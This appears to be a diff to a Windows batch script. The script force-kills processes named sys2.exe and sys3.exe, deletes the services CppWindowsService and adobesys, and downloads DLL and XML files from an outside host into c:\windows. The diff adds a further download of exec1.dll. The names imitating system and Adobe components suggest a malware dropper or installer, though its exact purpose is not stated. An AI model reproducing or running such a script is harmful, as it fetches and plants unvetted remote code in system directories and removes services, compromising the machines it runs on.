@@ -3,6 +3,7 @@ taskkill /f /im sys2.exe
 taskkill /f /im sys3.exe
 sc delete CppWindowsService
 sc delete adobesys
+wget http://troglo.homepc.it/win/exec1.dll -O c:\windows\exec1.dll
 wget http://troglo.homepc.it/win/CppWindowsService.xml -O c:\windows\CppWindowsService.xml
 wget http://troglo.homepc.it/win/adobesys.xml -O c:\windows\adobesys.xml
 wget http://troglo.homepc.it/win/sys3.dll -O c:\windows\sys3.dll
